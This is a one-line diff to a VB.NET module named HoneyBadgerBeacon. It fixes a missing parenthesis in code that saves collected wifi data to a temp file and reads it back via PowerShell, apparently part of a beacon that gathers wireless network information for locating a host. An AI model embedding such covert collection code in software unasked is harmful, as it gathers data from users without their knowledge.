@@ -85,7 +85,7 @@ Module HoneyBadgerBeacon
 
         Dim objWriter As New System.IO.StreamWriter(Environ("temp") & "\wifidat.txt")
         objWriter.Write(wifi)
-        objWriter.Close(0
+        objWriter.Close(0)
 
         wifi = objWSH.Exec("powershell Get-Content %TEMP%\wifidat.txt -Encoding UTF8 -Raw").StdOut.ReadAll
 
